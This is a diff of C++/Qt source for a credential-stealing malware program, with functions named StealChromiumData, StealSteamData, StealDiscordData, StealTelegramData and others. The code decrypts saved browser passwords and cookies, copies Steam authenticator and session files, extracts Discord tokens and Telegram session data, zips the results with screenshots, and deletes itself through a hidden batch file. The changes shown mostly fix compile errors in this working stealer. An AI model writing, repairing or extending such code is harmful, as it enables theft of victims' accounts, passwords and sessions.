+                    DATA_BLOB encryptedData = { static_cast<DWORD>(sqlite3_column_bytes(stmt, 2)), const_cast<BYTE*>(static_cast<const BYTE*>(sqlite3_column_blob(stmt, 2))) };
                     std::string value = DecryptChromiumData(encryptedData);
                     if (!value.empty()) {
                         if (host.find("mail.google.com") != std::string::npos || host.find("outlook.com") != std::string::npos ||
@@ -933,12 +944,12 @@ std::string StealChromiumData(const std::string& browserName, const std::string&
                 sqlite3_finalize(stmt);
             } else {
                 std::lock_guard<std::mutex> lock(g_mutex);
-                if (g_mainWindow) g_mainWindow->appendLog("Failed to prepare SQLite statement for cookies in " + browserName);
+                if (g_mainWindow) g_mainWindow->appendLog(QString::fromStdString("Failed to prepare SQLite statement for cookies in " + browserName));
             }
             sqlite3_close(db);
         } else {
             std::lock_guard<std::mutex> lock(g_mutex);
-            if (g_mainWindow) g_mainWindow->appendLog("Failed to open Cookies database for " + browserName);
+            if (g_mainWindow) g_mainWindow->appendLog(QString::fromStdString("Failed to open Cookies database for " + browserName));
         }
     }
 
@@ -946,13 +957,13 @@ std::string StealChromiumData(const std::string& browserName, const std::string&
     db = nullptr;
     if (g_mainWindow->config.passwords && std::filesystem::exists(loginDbPath)) {
         if (sqlite3_open(loginDbPath.c_str(), &db) == SQLITE_OK) {
-            sqlite3_stmt* stmt;
+            sqlite3_stmt* stmt = nullptr;
             const char* query = "SELECT origin_url, username_value, password_value FROM logins";
             if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) == SQLITE_OK) {
                 while (sqlite3_step(stmt) == SQLITE_ROW) {
                     std::string url = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
                     std::string username = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
-                    DATA_BLOB encryptedData = { sqlite3_column_bytes(stmt, 2), (BYTE*)sqlite3_column_blob(stmt, 2) };
+                    DATA_BLOB encryptedData = { static_cast<DWORD>(sqlite3_column_bytes(stmt, 2)), const_cast<BYTE*>(static_cast<const BYTE*>(sqlite3_column_blob(stmt, 2))) };
                     std::string password = DecryptChromiumData(encryptedData);
                     if (!password.empty()) {
                         if (url.find("mail.google.com") != std::string::npos || url.find("outlook.com") != std::string::npos ||
@@ -969,12 +980,12 @@ std::string StealChromiumData(const std::string& browserName, const std::string&
                 sqlite3_finalize(stmt);
             } else {
                 std::lock_guard<std::mutex> lock(g_mutex);
-                if (g_mainWindow) g_mainWindow->appendLog("Failed to prepare SQLite statement for passwords in " + browserName);
+                if (g_mainWindow) g_mainWindow->appendLog(QString::fromStdString("Failed to prepare SQLite statement for passwords in " + browserName));
             }
             sqlite3_close(db);
         } else {
             std::lock_guard<std::mutex> lock(g_mutex);
-            if (g_mainWindow) g_mainWindow->appendLog("Failed to open Login Data database for " + browserName);
+            if (g_mainWindow) g_mainWindow->appendLog(QString::fromStdString("Failed to open Login Data database for " + browserName));
         }
     }
 
@@ -986,22 +997,22 @@ std::string StealBrowserData() {
     std::string result;
     if (!g_mainWindow || (!g_mainWindow->config.cookies && !g_mainWindow->config.passwords)) return result;
 
-    char* appDataPath;
+    char* appDataPath = nullptr;
     size_t len;
     _dupenv_s(&appDataPath, &len, "APPDATA");
     if (!appDataPath) {
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Failed to get APPDATA path");
+        if (g_mainWindow) g_mainWindow->appendLog(QString("Failed to get APPDATA path"));
         return result;
     }
     std::string appData(appDataPath);
     free(appDataPath);
 
-    char* localAppDataPath;
+    char* localAppDataPath = nullptr;
     _dupenv_s(&localAppDataPath, &len, "LOCALAPPDATA");
     if (!localAppDataPath) {
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Failed to get LOCALAPPDATA path");
+        if (g_mainWindow) g_mainWindow->appendLog(QString("Failed to get LOCALAPPDATA path"));
         return result;
     }
     std::string localAppData(localAppDataPath);
@@ -1038,16 +1049,16 @@ std::string StealSteamData() {
     HKEY hKey;
     if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Valve\\Steam", 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Failed to open Steam registry key");
+        if (g_mainWindow) g_mainWindow->appendLog(QString("Failed to open Steam registry key"));
         return result;
     }
 
-    char steamPath[MAX_PATH];
+    char steamPath[MAX_PATH] = {0};
     DWORD pathSize = sizeof(steamPath);
     if (RegQueryValueExA(hKey, "SteamPath", nullptr, nullptr, (LPBYTE)steamPath, &pathSize) != ERROR_SUCCESS) {
         RegCloseKey(hKey);
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Failed to read SteamPath from registry");
+        if (g_mainWindow) g_mainWindow->appendLog(QString("Failed to read SteamPath from registry"));
         return result;
     }
     RegCloseKey(hKey);
@@ -1065,10 +1076,10 @@ std::string StealSteamData() {
                 configFile.close();
                 result += "[Steam] Login Users:\n" + content + "\n";
                 std::lock_guard<std::mutex> lock(g_mutex);
-                if (g_mainWindow) g_mainWindow->appendLog("Extracted Steam loginusers.vdf");
+                if (g_mainWindow) g_mainWindow->appendLog(QString("Extracted Steam loginusers.vdf"));
             } else {
                 std::lock_guard<std::mutex> lock(g_mutex);
-                if (g_mainWindow) g_mainWindow->appendLog("Failed to open Steam loginusers.vdf");
+                if (g_mainWindow) g_mainWindow->appendLog(QString("Failed to open Steam loginusers.vdf"));
             }
         }
 
@@ -1083,17 +1094,17 @@ std::string StealSteamData() {
                         ssfnFile.close();
                         result += "[Steam] SSFN File (" + ssfnPath + "):\n" + content + "\n";
                         std::lock_guard<std::mutex> lock(g_mutex);
-                        if (g_mainWindow) g_mainWindow->appendLog("Extracted Steam SSFN file: " + ssfnPath);
+                        if (g_mainWindow) g_mainWindow->appendLog(QString::fromStdString("Extracted Steam SSFN file: " + ssfnPath));
                     } else {
                         std::lock_guard<std::mutex> lock(g_mutex);
-                        if (g_mainWindow) g_mainWindow->appendLog("Failed to open Steam SSFN file: " + ssfnPath);
+                        if (g_mainWindow) g_mainWindow->appendLog(QString::fromStdString("Failed to open Steam SSFN file: " + ssfnPath));
                     }
                     break;
                 }
             }
         } catch (const std::exception& e) {
             std::lock_guard<std::mutex> lock(g_mutex);
-            if (g_mainWindow) g_mainWindow->appendLog("Error accessing Steam directory: " + std::string(e.what()));
+            if (g_mainWindow) g_mainWindow->appendLog(QString::fromStdString("Error accessing Steam directory: " + std::string(e.what())));
         }
 
         // Захват WebSocket сессий Steam
@@ -1121,16 +1132,16 @@ std::string StealSteamData() {
                         maFile.close();
                         result += "[Steam] MA File (" + maFilePath + "):\n" + content + "\n";
                         std::lock_guard<std::mutex> lock(g_mutex);
-                        if (g_mainWindow) g_mainWindow->appendLog("Extracted Steam MA file: " + maFilePath);
+                        if (g_mainWindow) g_mainWindow->appendLog(QString::fromStdString("Extracted Steam MA file: " + maFilePath));
                     } else {
                         std::lock_guard<std::mutex> lock(g_mutex);
-                        if (g_mainWindow) g_mainWindow->appendLog("Failed to open Steam MA file: " + maFilePath);
+                        if (g_mainWindow) g_mainWindow->appendLog(QString::fromStdString("Failed to open Steam MA file: " + maFilePath));
                     }
                 }
             }
         } catch (const std::exception& e) {
             std::lock_guard<std::mutex> lock(g_mutex);
-            if (g_mainWindow) g_mainWindow->appendLog("Error accessing Steam MA files: " + std::string(e.what()));
+            if (g_mainWindow) g_mainWindow->appendLog(QString::fromStdString("Error accessing Steam MA files: " + std::string(e.what())));
         }
     }
 
@@ -1142,12 +1153,12 @@ std::string StealEpicGamesData() {
     std::string result;
     if (!g_mainWindow || !g_mainWindow->config.epic) return result;
 
-    char* localAppDataPath;
+    char* localAppDataPath = nullptr;
     size_t len;
     _dupenv_s(&localAppDataPath, &len, "LOCALAPPDATA");
     if (!localAppDataPath) {
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Failed to get LOCALAPPDATA path for Epic Games");
+        if (g_mainWindow) g_mainWindow->appendLog(QString("Failed to get LOCALAPPDATA path for Epic Games"));
         return result;
     }
     std::string localAppData(localAppDataPath);
@@ -1156,7 +1167,7 @@ std::string StealEpicGamesData() {
     std::string epicPath = localAppData + "\\EpicGamesLauncher\\Saved\\Config\\Windows\\";
     if (!std::filesystem::exists(epicPath)) {
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Epic Games config path not found: " + epicPath);
+        if (g_mainWindow) g_mainWindow->appendLog(QString::fromStdString("Epic Games config path not found: " + epicPath));
         return result;
     }
 
@@ -1169,10 +1180,10 @@ std::string StealEpicGamesData() {
                     iniFile.close();
                     result += "[Epic Games] GameUserSettings.ini:\n" + content + "\n";
                     std::lock_guard<std::mutex> lock(g_mutex);
-                    if (g_mainWindow) g_mainWindow->appendLog("Extracted Epic Games GameUserSettings.ini");
+                    if (g_mainWindow) g_mainWindow->appendLog(QString("Extracted Epic Games GameUserSettings.ini"));
                 } else {
                     std::lock_guard<std::mutex> lock(g_mutex);
-                    if (g_mainWindow) g_mainWindow->appendLog("Failed to open Epic Games GameUserSettings.ini");
+                    if (g_mainWindow) g_mainWindow->appendLog(QString("Failed to open Epic Games GameUserSettings.ini"));
                 }
             }
         }
@@ -1194,7 +1205,7 @@ std::string StealEpicGamesData() {
         }
     } catch (const std::exception& e) {
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Error accessing Epic Games data: " + std::string(e.what()));
+        if (g_mainWindow) g_mainWindow->appendLog(QString::fromStdString("Error accessing Epic Games data: " + std::string(e.what())));
     }
 
     return result;
@@ -1205,12 +1216,12 @@ std::string StealRobloxData() {
     std::string result;
     if (!g_mainWindow || !g_mainWindow->config.roblox) return result;
 
-    char* appDataPath;
+    char* appDataPath = nullptr;
     size_t len;
     _dupenv_s(&appDataPath, &len, "APPDATA");
     if (!appDataPath) {
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Failed to get APPDATA path for Roblox");
+        if (g_mainWindow) g_mainWindow->appendLog(QString("Failed to get APPDATA path for Roblox"));
         return result;
     }
     std::string appData(appDataPath);
@@ -1219,7 +1230,7 @@ std::string StealRobloxData() {
     std::string robloxPath = appData + "\\Roblox\\";
     if (!std::filesystem::exists(robloxPath)) {
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Roblox path not found: " + robloxPath);
+        if (g_mainWindow) g_mainWindow->appendLog(QString::fromStdString("Roblox path not found: " + robloxPath));
         return result;
     }
 
@@ -1232,10 +1243,10 @@ std::string StealRobloxData() {
                     settingsFile.close();
                     result += "[Roblox] GlobalBasicSettings:\n" + content + "\n";
                     std::lock_guard<std::mutex> lock(g_mutex);
-                    if (g_mainWindow) g_mainWindow->appendLog("Extracted Roblox GlobalBasicSettings");
+                    if (g_mainWindow) g_mainWindow->appendLog(QString("Extracted Roblox GlobalBasicSettings"));
                 } else {
                     std::lock_guard<std::mutex> lock(g_mutex);
-                    if (g_mainWindow) g_mainWindow->appendLog("Failed to open Roblox GlobalBasicSettings");
+                    if (g_mainWindow) g_mainWindow->appendLog(QString("Failed to open Roblox GlobalBasicSettings"));
                 }
             }
         }
@@ -1251,7 +1262,7 @@ std::string StealRobloxData() {
         }
     } catch (const std::exception& e) {
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Error accessing Roblox data: " + std::string(e.what()));
+        if (g_mainWindow) g_mainWindow->appendLog(QString::fromStdString("Error accessing Roblox data: " + std::string(e.what())));
     }
 
     return result;
@@ -1262,12 +1273,12 @@ std::string StealBattleNetData() {
     std::string result;
     if (!g_mainWindow || !g_mainWindow->config.battlenet) return result;
 
-    char* appDataPath;
+    char* appDataPath = nullptr;
     size_t len;
     _dupenv_s(&appDataPath, &len, "APPDATA");
     if (!appDataPath) {
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Failed to get APPDATA path for Battle.net");
+        if (g_mainWindow) g_mainWindow->appendLog(QString("Failed to get APPDATA path for Battle.net"));
         return result;
     }
     std::string appData(appDataPath);
@@ -1276,7 +1287,7 @@ std::string StealBattleNetData() {
     std::string battleNetPath = appData + "\\Battle.net\\";
     if (!std::filesystem::exists(battleNetPath)) {
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Battle.net path not found: " + battleNetPath);
+        if (g_mainWindow) g_mainWindow->appendLog(QString::fromStdString("Battle.net path not found: " + battleNetPath));
         return result;
     }
 
@@ -1289,10 +1300,10 @@ std::string StealBattleNetData() {
                     configFile.close();
                     result += "[Battle.net] Config File (" + entry.path().string() + "):\n" + content + "\n";
                     std::lock_guard<std::mutex> lock(g_mutex);
-                    if (g_mainWindow) g_mainWindow->appendLog("Extracted Battle.net config: " + entry.path().string());
+                    if (g_mainWindow) g_mainWindow->appendLog(QString::fromStdString("Extracted Battle.net config: " + entry.path().string()));
                 } else {
                     std::lock_guard<std::mutex> lock(g_mutex);
-                    if (g_mainWindow) g_mainWindow->appendLog("Failed to open Battle.net config: " + entry.path().string());
+                    if (g_mainWindow) g_mainWindow->appendLog(QString::fromStdString("Failed to open Battle.net config: " + entry.path().string()));
                 }
             }
         }
@@ -1314,7 +1325,7 @@ std::string StealBattleNetData() {
         }
     } catch (const std::exception& e) {
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Error accessing Battle.net data: " + std::string(e.what()));
+        if (g_mainWindow) g_mainWindow->appendLog(QString::fromStdString("Error accessing Battle.net data: " + std::string(e.what())));
     }
 
     return result;
@@ -1325,12 +1336,12 @@ std::string StealMinecraftData() {
     std::string result;
     if (!g_mainWindow || !g_mainWindow->config.minecraft) return result;
 
-    char* appDataPath;
+    char* appDataPath = nullptr;
     size_t len;
     _dupenv_s(&appDataPath, &len, "APPDATA");
     if (!appDataPath) {
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Failed to get APPDATA path for Minecraft");
+        if (g_mainWindow) g_mainWindow->appendLog(QString("Failed to get APPDATA path for Minecraft"));
         return result;
     }
     std::string appData(appDataPath);
@@ -1339,7 +1350,7 @@ std::string StealMinecraftData() {
     std::string minecraftPath = appData + "\\.minecraft\\";
     if (!std::filesystem::exists(minecraftPath)) {
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Minecraft path not found: " + minecraftPath);
+        if (g_mainWindow) g_mainWindow->appendLog(QString::fromStdString("Minecraft path not found: " + minecraftPath));
         return result;
     }
 
@@ -1352,10 +1363,10 @@ std::string StealMinecraftData() {
                 profileFile.close();
                 result += "[Minecraft] Launcher Profiles:\n" + content + "\n";
                 std::lock_guard<std::mutex> lock(g_mutex);
-                if (g_mainWindow) g_mainWindow->appendLog("Extracted Minecraft launcher_profiles.json");
+                if (g_mainWindow) g_mainWindow->appendLog(QString("Extracted Minecraft launcher_profiles.json"));
             } else {
                 std::lock_guard<std::mutex> lock(g_mutex);
-                if (g_mainWindow) g_mainWindow->appendLog("Failed to open Minecraft launcher_profiles.json");
+                if (g_mainWindow) g_mainWindow->appendLog(QString("Failed to open Minecraft launcher_profiles.json"));
             }
         }
 
@@ -1369,10 +1380,10 @@ std::string StealMinecraftData() {
                         logFile.close();
                         result += "[Minecraft] Log File (" + entry.path().string() + "):\n" + content + "\n";
                         std::lock_guard<std::mutex> lock(g_mutex);
-                        if (g_mainWindow) g_mainWindow->appendLog("Extracted Minecraft log: " + entry.path().string());
+                        if (g_mainWindow) g_mainWindow->appendLog(QString::fromStdString("Extracted Minecraft log: " + entry.path().string()));
                     } else {
                         std::lock_guard<std::mutex> lock(g_mutex);
-                        if (g_mainWindow) g_mainWindow->appendLog("Failed to open Minecraft log: " + entry.path().string());
+                        if (g_mainWindow) g_mainWindow->appendLog(QString::fromStdString("Failed to open Minecraft log: " + entry.path().string()));
                     }
                 }
             }
@@ -1389,7 +1400,7 @@ std::string StealMinecraftData() {
         }
     } catch (const std::exception& e) {
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Error accessing Minecraft data: " + std::string(e.what()));
+        if (g_mainWindow) g_mainWindow->appendLog(QString::fromStdString("Error accessing Minecraft data: " + std::string(e.what())));
     }
 
     return result;
@@ -1400,12 +1411,12 @@ std::string StealDiscordData() {
     std::string result;
     if (!g_mainWindow || !g_mainWindow->config.discord) return result;
 
-    char* appDataPath;
+    char* appDataPath = nullptr;
     size_t len;
     _dupenv_s(&appDataPath, &len, "APPDATA");
     if (!appDataPath) {
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Failed to get APPDATA path for Discord");
+        if (g_mainWindow) g_mainWindow->appendLog(QString("Failed to get APPDATA path for Discord"));
         return result;
     }
     std::string appData(appDataPath);
@@ -1414,7 +1425,7 @@ std::string StealDiscordData() {
     std::string discordPath = appData + "\\Discord\\";
     if (!std::filesystem::exists(discordPath)) {
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Discord path not found: " + discordPath);
+        if (g_mainWindow) g_mainWindow->appendLog(QString::fromStdString("Discord path not found: " + discordPath));
         return result;
     }
 
@@ -1444,12 +1455,12 @@ std::string StealDiscordData() {
                         }
                     } else {
                         std::lock_guard<std::mutex> lock(g_mutex);
-                        if (g_mainWindow) g_mainWindow->appendLog("Failed to open Discord leveldb file: " + entry.path().string());
+                        if (g_mainWindow) g_mainWindow->appendLog(QString::fromStdString("Failed to open Discord leveldb file: " + entry.path().string()));
                     }
                 }
             }
             std::lock_guard<std::mutex> lock(g_mutex);
-            if (g_mainWindow && !result.empty()) g_mainWindow->appendLog("Extracted Discord tokens and emails");
+            if (g_mainWindow && !result.empty()) g_mainWindow->appendLog(QString("Extracted Discord tokens and emails"));
         }
 
         std::string cachePath = discordPath + "Cache\\";
@@ -1469,7 +1480,7 @@ std::string StealDiscordData() {
         }
     } catch (const std::exception& e) {
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Error accessing Discord data: " + std::string(e.what()));
+        if (g_mainWindow) g_mainWindow->appendLog(QString::fromStdString("Error accessing Discord data: " + std::string(e.what())));
     }
 
     return result;
@@ -1480,12 +1491,12 @@ std::string StealTelegramData() {
     std::string result;
     if (!g_mainWindow || !g_mainWindow->config.telegram) return result;
 
-    char* appDataPath;
+    char* appDataPath = nullptr;
     size_t len;
     _dupenv_s(&appDataPath, &len, "APPDATA");
     if (!appDataPath) {
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Failed to get APPDATA path for Telegram");
+        if (g_mainWindow) g_mainWindow->appendLog(QString("Failed to get APPDATA path for Telegram"));
         return result;
     }
     std::string appData(appDataPath);
@@ -1494,7 +1505,7 @@ std::string StealTelegramData() {
     std::string telegramPath = appData + "\\Telegram Desktop\\tdata\\";
     if (!std::filesystem::exists(telegramPath)) {
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Telegram path not found: " + telegramPath);
+        if (g_mainWindow) g_mainWindow->appendLog(QString::fromStdString("Telegram path not found: " + telegramPath));
         return result;
     }
 
@@ -1508,10 +1519,10 @@ std::string StealTelegramData() {
                     dataFile.close();
                     result += "[Telegram] File (" + filename + "):\n" + content + "\n";
                     std::lock_guard<std::mutex> lock(g_mutex);
-                    if (g_mainWindow) g_mainWindow->appendLog("Extracted Telegram file: " + filename);
+                    if (g_mainWindow) g_mainWindow->appendLog(QString::fromStdString("Extracted Telegram file: " + filename));
                 } else {
                     std::lock_guard<std::mutex> lock(g_mutex);
-                    if (g_mainWindow) g_mainWindow->appendLog("Failed to open Telegram file: " + filename);
+                    if (g_mainWindow) g_mainWindow->appendLog(QString::fromStdString("Failed to open Telegram file: " + filename));
                 }
             }
         }
@@ -1522,7 +1533,7 @@ std::string StealTelegramData() {
         }
     } catch (const std::exception& e) {
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Error accessing Telegram data: " + std::string(e.what()));
+        if (g_mainWindow) g_mainWindow->appendLog(QString::fromStdString("Error accessing Telegram data: " + std::string(e.what())));
     }
 
     return result;
@@ -1590,7 +1601,7 @@ bool CreateZipArchive(const std::string& zipPath, const std::string& data, const
     zip_t* zip = zip_open(zipPath.c_str(), ZIP_CREATE | ZIP_TRUNCATE, nullptr);
     if (!zip) {
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Failed to create ZIP archive: " + zipPath);
+        if (g_mainWindow) g_mainWindow->appendLog(QString::fromStdString("Failed to create ZIP archive: " + zipPath));
         return false;
     }
 
@@ -1599,7 +1610,7 @@ bool CreateZipArchive(const std::string& zipPath, const std::string& data, const
     if (!source) {
         zip_close(zip);
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Failed to create ZIP source for data");
+        if (g_mainWindow) g_mainWindow->appendLog(QString("Failed to create ZIP source for data"));
         return false;
     }
 
@@ -1607,7 +1618,7 @@ bool CreateZipArchive(const std::string& zipPath, const std::string& data, const
         zip_source_free(source);
         zip_close(zip);
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Failed to add data.txt to ZIP");
+        if (g_mainWindow) g_mainWindow->appendLog(QString("Failed to add data.txt to ZIP"));
         return false;
     }
 
@@ -1618,7 +1629,7 @@ bool CreateZipArchive(const std::string& zipPath, const std::string& data, const
             if (!fileSource) {
                 zip_close(zip);
                 std::lock_guard<std::mutex> lock(g_mutex);
-                if (g_mainWindow) g_mainWindow->appendLog("Failed to create ZIP source for screenshot: " + screenshot);
+                if (g_mainWindow) g_mainWindow->appendLog(QString::fromStdString("Failed to create ZIP source for screenshot: " + screenshot));
                 return false;
             }
 
@@ -1626,20 +1637,24 @@ bool CreateZipArchive(const std::string& zipPath, const std::string& data, const
                 zip_source_free(fileSource);
                 zip_close(zip);
                 std::lock_guard<std::mutex> lock(g_mutex);
-                if (g_mainWindow) g_mainWindow->appendLog("Failed to add screenshot to ZIP: " + screenshot);
+                if (g_mainWindow) g_mainWindow->appendLog(QString::fromStdString("Failed to add screenshot to ZIP: " + screenshot));
                 return false;
             }
         }
     }
 
     if (zip_close(zip) < 0) {
+        zip_error_t error;
+        zip_error_init(&error);
+        zip_error_set(&error, zip_get_error(zip)->zip_err, 0);
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Failed to close ZIP archive: " + std::string(zip_error_strerror(zip_error_init_with_code(zip_get_error(zip)->zip_err))));
+        if (g_mainWindow) g_mainWindow->appendLog(QString::fromStdString("Failed to close ZIP archive: " + std::string(zip_error_strerror(&error))));
+        zip_error_fini(&error);
         return false;
     }
 
     std::lock_guard<std::mutex> lock(g_mutex);
-    if (g_mainWindow) g_mainWindow->appendLog("Created ZIP archive: " + zipPath);
+    if (g_mainWindow) g_mainWindow->appendLog(QString::fromStdString("Created ZIP archive: " + zipPath));
     return true;
 }
 
@@ -1647,7 +1662,7 @@ bool CreateZipArchive(const std::string& zipPath, const std::string& data, const
 void SelfDestruct() {
     if (!g_mainWindow || !g_mainWindow->config.selfDestruct) return;
 
-    char path[MAX_PATH];
+    char path[MAX_PATH] = {0};
     GetModuleFileNameA(nullptr, path, MAX_PATH);
     std::string exePath = path;
 
@@ -1662,10 +1677,10 @@ void SelfDestruct() {
         batchFile.close();
         ShellExecuteA(nullptr, "open", batchPath.c_str(), nullptr, nullptr, SW_HIDE);
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Self-destruct initiated");
+        if (g_mainWindow) g_mainWindow->appendLog(QString("Self-destruct initiated"));
     } else {
         std::lock_guard<std::mutex> lock(g_mutex);
-        if (g_mainWindow) g_mainWindow->appendLog("Failed to create self-destruct batch file");
+        if (g_mainWindow) g_mainWindow->appendLog(QString("Failed to create self-destruct batch file"));
     }
 }
 
